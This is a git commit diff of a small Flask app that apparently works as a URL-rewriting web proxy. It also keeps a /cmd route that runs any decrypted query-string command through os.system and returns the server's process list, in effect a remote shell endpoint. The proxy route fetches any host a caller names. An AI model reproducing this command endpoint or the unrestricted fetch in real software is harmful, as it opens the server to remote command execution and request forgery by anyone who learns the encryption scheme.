a48934a74bb30803b41a5ea594af836e170c4b82
nox <a3335581@126.com>
2022-10-28 19:32:39 +0800

    202210281932

--- app.py
+++ app.py
@@ -32,32 +32,33 @@ headers = {
 #     # 一些自己的逻辑...
 #     return requests.request(request.method, request.url, data=request.json, headers=headers).content
 
-@app.route('/url/')
+@app.route('/url')
 def url():
     html = ''
     try:
         print(request.args.get("url"))
         url = decrypt(request.args.get("url").replace(' ', '+'))
-        print('url', url)
         html = requests.get(url=f'http://{url}', headers=headers).text.encode().decode('utf-8')
-        with open("tmp.html", 'w') as f:
-            f.write(html)
+        # with open("tmp.html", 'w') as f:
+        #     f.write(html)
         # try:
         soup = bs4.BeautifulSoup(html, "html.parser")
         href_set = {item.get('href') for item in soup.find_all(href=True)}
         replace_dict = {}
         # print(href_set)
         SS = '/url/?url='
+        if not url.endswith('/'):
+            url += '/'
         for item in href_set:
             try:
                 if item.startswith('https://'):
                     replace_dict[item] = f'{SS}{encrypt(item)}'
                 elif item.startswith('http://'):
                     replace_dict[item] = f'{SS}{encrypt(item)}'
-                # elif item.startswith('//'):
-                #     replace_dict[item] = f'{SS}{encrypt(f"http:{item}")}'
-                # elif item.startswith('/'):
-                #     replace_dict[item] = f'{SS}{encrypt(f"http://{url}{item}")}'
+                elif item.startswith('//'):
+                    replace_dict[item] = f'{SS}{encrypt(f"http:{item}")}'
+                elif item.startswith('/'):
+                    replace_dict[item] = f'{SS}{encrypt(f"http://{url}{item}")}'
             except:
                 pass
         # href_set = {"" if item in replace_dict else item for item in href_set}
@@ -66,19 +67,18 @@ def url():
             print(key, replace_dict[key])
             html = html.replace(key, replace_dict[key])
     except Exception as e:
-        print(e)
+        html = str(e).replace('\n', '<br>')
     return html
 
 
-@app.route('/cmd/')
+@app.route('/cmd')
 def cmd():
     cmd = decrypt(request.args.get("cmd").replace(' ', '+'))
     os.system(cmd)
-    time.sleep(0.5)
-    os.system("ps -ef|grep python > cmd.log")
-    time.sleep(0.5)
+    os.system("ps -ef > cmd.log")
     with open("cmd.log", 'r') as f:
-        return '<br>'.join(f.readlines())
+        ret = '<br>'.join(f.readlines())
+    return ret
 
 
 if __name__ == "__main__":
